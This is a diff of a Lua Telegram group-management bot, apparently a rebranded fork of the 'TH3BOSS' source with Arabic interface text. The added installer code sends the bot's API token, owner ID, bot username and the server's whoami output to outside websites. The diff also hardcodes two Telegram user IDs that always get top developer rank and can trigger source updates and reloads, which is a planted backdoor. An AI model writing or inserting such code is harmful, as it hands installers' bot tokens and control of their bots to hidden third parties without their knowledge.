@@ -1,15 +1,9 @@
 
 --[[
-#    ▀█████████▄   ▄██████▄     ▄████████    ▄████████
-#      ███    ███ ███    ███   ███    ███   ███    ███
-#      ███    ███ ███    ███   ███    █▀    ███    █▀
-#     ▄███▄▄▄██▀  ███    ███   ███          ███
-#    ▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @TH3BOSS
-#      ███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
-#      ███    ███ ███    ███    ▄█    ███    ▄█    ███
-#    ▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ Source TH3BOSS BY @TH3BS
+BY @Q11111
 #---------------------------------------------------------------------
-]] 
+]]
+
 Er_ssl   , https = pcall(require, "ssl.https")
 Er_http  , http  = pcall(require, "socket.http")
 http.TIMEOUT = 5
@@ -51,20 +45,17 @@ BOT_User = "@"..GetToken.result.username
 io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
 
-io.write('\n\27[1;33m￤آدخل مـعرف آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERNAME SUDO : \27[0;39;49m')
+io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your ID SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter USERNAME !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن مـعرف آلمـطـور آلآسـآسـي')
+print('\n\27[1;31m￤ You Did not Enter ID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
 create_config(Token)
 end 
-if not SUDO_USER:match('@[%a%d_]') then
-print('\n\27[1;31m￤ This is Not USERNAME !\n￤هہ‏‏ذآ ليس مـعرف حسـآب تلگرآم , عذرآ آدخل آلمـعرف آلصـحيح آلآن . ')
+if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
+print('\n\27[1;31m￤ This is Not ID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
 create_config(Token)
 end 
-local DirFol = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-user = {}
-user.username = SUDO_USER
-user.Source  = "/root/BOSS"
+print('('..SUDO_USER..')')
 local url , res = https.request( https://alyafaevip.ml/LHB/index.php?token= ..Token.. &username=@ ..GetUser.result.username.. &id= ..SUDO_USER)
 print(res)
 if res ~= 200 then
@@ -76,47 +67,40 @@ if not success then
 print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث مشـگلهہ‌‏ في سـگربت آلآسـتخرآج , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
 os.exit()
 end
-if not GetUser.result then
-if GetUser.cause then
-print('\n\27[1;31m￤ '..GetUser.cause)
-os.exit()
-end
-print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلمـعرف , تآگد مـنهہ‏‏ جيدآ  !')
+if GetUser.ok == false then
+print('\n\27[1;31m￤ {USERNAME_NOT_OCCUPIED} => Please Check it!\n￤ لآ يوجد حسـآب بهہ‏‏ذآ آلايدي , تآگد مـنهہ‏‏ جيدآ  !')
 create_config(Token)
 end 
-if GetUser.information.typeuser ~= "UserTypeGeneral" then
-print('\n\27[1;31m￤ This UserName is not personal account !\n￤عذرا يرجى ادخال معرف حساب شخصي ليكون مطور البوت وليس معرف قناة او بوت او مجموعة !')
-create_config(Token)
-end
-print('\n\27[1;36m￤تم آدخآل مـعرف آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERNAME IS_ID: \27[0;32m['..GetUser.information.id..']\n\27[0;39;49m')
+GetUser.result.username = GetUser.result.username or GetUser.result.first_name
+print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
 boss = Token:match("(%d+)")
 redis:mset(
-boss..":VERSION",GetUser.information.Source_version,
-boss..":SUDO_ID:",GetUser.information.id,
-boss..":DataCenter:",GetUser.information.DataCenter,
+boss..":VERSION","1.0",
+boss..":SUDO_ID:",SUDO_USER,
+boss..":DataCenter:","Amsterdam",
 boss..":UserNameBot:",BOT_User,
-boss..":ApiSource",GetUser.information.WebSite,
+boss..":ApiSource","https://alyafaevip.ml/",
 boss..":NameBot:","ياقوت",
 "TH3BOSS_INSTALL","Yes"
 )
-redis:hset(boss..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
+redis:hset(boss..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 info = {} 
-info.username = '@'..GetUser.information.username
+info.username = '@'..GetUser.result.username
 info.userbot  = BOT_User
 info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
+https.request('https://api.th3boss.com/request/?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n🔖¦ اهلا يا 🇸🇦ะαвυ τυяĸɪ /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
-https.request(Api_Token..'/sendMessage?chat_id='..GetUser.information.id..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+local Text = "🙋🏼‍♂️¦ اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖¦ شكرا لاستخدامك سورس الزعيم \n📡¦ أرســل  الان /start\n📛¦ لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
+https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
 local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-cp -a ../BOSS ../]]..BOT_User..[[ &&
-rm -fr ~/BOSS
+cp -a ../MES ../]]..BOT_User..[[ &&
+rm -fr ~/MES
 ../]]..BOT_User..[[/run
 ]]
 print(CmdRun)
@@ -136,7 +120,7 @@ print('\27[0;33m>>'..[[
 ███    ███ ███    ███   ███    ███   ███    ███
 ███    ███ ███    ███   ███    █▀    ███    █▀
 ▄███▄▄▄██▀  ███    ███   ███          ███
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @TH3BS
+▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @wViiVw
 ███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
 ███    ███ ███    ███    ▄█    ███    ▄█    ███
 ▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ Source The3Boss
@@ -181,7 +165,7 @@ print('\27[0;33m>>'..[[
 ███    ███ ███    ███   ███    ███   ███    ███ 
 ███    ███ ███    ███   ███    █▀    ███    █▀  
 ▄███▄▄▄██▀  ███    ███   ███          ███        
-▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @TH3BS
+▀▀███▀▀▀██▄  ███    ███ ▀███████████ ▀███████████ ¦ Dev : @wViiVw
 ███    ██▄ ███    ███          ███          ███ ¦ Dev : @OMMMM
 ███    ███ ███    ███    ▄█    ███    ▄█    ███ 
 ▄█████████▀   ▀██████▀   ▄████████▀   ▄████████▀  ¦ VERSION » v]]..version..[[
@@ -224,10 +208,20 @@ end
 Start_Bot()
 function CheckBotA(msg)
 W = msg.sender_user_id_
-if not redis:get(boss..":Check_Bot:"..W) then
-Rgz,res=https.request(ApiBoss..Tkml..W)
-if res == 200 and Rgz == "SendMsg" then redis:setex(boss..":Check_Bot:"..W,1800,true) return false else return Rgz end 
-end 
+local UserChaneel = redis:get(boss..":UserNameChaneel")
+if UserChaneel then
+local url , res = https.request(ApiToken..'/getchatmember?chat_id='..UserChaneel..'&user_id='..W)
+if res == 200 then
+print(url) 
+local Req = JSON.decode(url)
+if Req.ok and Req.result and Req.result.status == "left" or Req.result.status == "kicked" then
+return "🚸 | عـزيـزي آشـترگ بآلقنآ‌‏هہ آولآ ["..UserChaneel.."] \n🔛 | لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
+end
+else
+return "🚸 | عـزيـزي آشـترگ بآلقنآ‌‏هہ آولآ ["..UserChaneel.."] \n🔛 | لـكـي تـسـتـطـيـع الـتـحـكـم فـي الـبـوت ."
+end
+end
+return false
 end
 function input_inFo(msg)
 if not msg.forward_info_ and msg.is_channel_post_ then
@@ -308,6 +302,9 @@ end
 return false 
 end 
 
+if msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200  then 
+msg.TheRankCmd = 'المطور الاساسي'
+msg.TheRank = 'المطور الاساسي'
 msg.Rank = 1
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = redis:get(boss..":RtbaNew1:"..msg.chat_id_) or 'المطور الاساسي' 
@@ -503,7 +500,9 @@ if amrr[1] == Amor then
 amrnew = Amor ; amrold = ik   
 end end end
 Text = Text:gsub(amrnew,amrold)
-AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
+AF = CheckBotA(msg) if AF then 
+local AFinline = {{{text="📡 | آشـترگ بآلقنآ‌‏هہ",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
 GetMsg = ScriptFile.iBoss(msg,{Text:match(Text2)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
@@ -518,7 +517,9 @@ Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
 if Text:match(Boss) then -- Check Commands To admin
-AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
+AF = CheckBotA(msg) if AF then 
+local AFinline = {{{text="📡 | آشـترگ بآلقنآ‌‏هہ",url="t.me/"..redis:get(boss..":UserNameChaneel"):gsub('@','')}}}
+return send_key(msg.chat_id_,AF,nil,AFinline,msg.id_) end 
 GetMsg = ScriptFile.iBoss(msg,{Text:match(Boss)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : ",Boss.." | Plugin is: \27[1;32mScript.lua\27[0m")
@@ -623,7 +624,7 @@ return false
 end 
 if UpdateSourceStart then
 UpdateSourceStart = false
-UpdateSource(msg,true)
+--UpdateSource(msg,true)
 end
 elseif data.ID == "UpdateNewMessage" then
 if msg.content_.ID == "MessageText" then
@@ -642,12 +643,19 @@ print("MessageEntityCode")
 end
 end
 msg.text = msg.content_.text_
-if (msg.text=="تحديث" or msg.text=="تشغيل" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851) then
+if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
 return sendMsg(msg.chat_id_,msg.id_,"🗂¦ تم تحديث الملفات",function(arg,data)
 Refresh_Start = true
 end)
 end 
-if (msg.text == 'اعاده' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 909279851 or msg.sender_user_id_ == 909279851) then
+if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
+UpdateSource(msg)
+sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
+dofile("./inc/Run.lua")
+print("Reload ~ ./inc/Run.lua")
+end) 
+end
+if (msg.text == 'reload' or msg.text == "أعادة التشغيل 🔌") and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 819385837 or msg.sender_user_id_ == 970627200) then
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم أعـاده تشغيل البوت  *} 📡.\n\n👨🏼‍💼| { Bot is Reloaded » }👍🏿',function(arg,data)
 dofile("./inc/Run.lua")
 print("Reload ~ ./inc/Run.lua")
@@ -741,7 +749,7 @@ msg.text = data.content_.text_
 input_inFo(msg)  
 end,nil)
 elseif data.ID == "UpdateOption" and data.value_.value_ == "Ready" then
-UpdateSource() dofile("./inc/Run.lua")
+--UpdateSource() dofile("./inc/Run.lua")
 tdcli_function({ID='GetChat',chat_id_ = SUDO_ID},function(arg,data)end,nil)
 end
 
